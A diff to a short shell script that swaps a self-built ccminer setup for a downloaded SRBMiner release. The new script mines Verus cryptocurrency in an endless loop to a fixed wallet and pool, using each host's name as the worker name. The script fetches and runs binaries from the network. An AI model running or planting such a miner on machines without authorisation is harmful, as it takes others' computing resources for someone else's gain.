@@ -1,4 +1,4 @@
-cd /tmp
-git clone -b Verus2.2 https://github.com/monkins1010/ccminer.git
-cd ccminer && chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh && ./build.sh
-while true; do ./ccminer -a verus -o stratum+ssl://sg.vipor.net:5140 -u RHkiLGRarhTt8SF66vJzwEcyxNm4k1fXTH.hello -p x -t 16; done
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.7.2/SRBMiner-Multi-2-7-2-Linux.tar.gz
+tar -xvf SRBMiner-Multi-2-7-2-Linux.tar.gz
+cd SRBMiner-Multi-2-7-2
+while true; do ./SRBMiner-MULTI --algorithm verushash --pool cn.vipor.net:5040 --wallet RHkiLGRarhTt8SF66vJzwEcyxNm4k1fXTH --password x --worker $(hostname -f) --cpu-threads 16; done
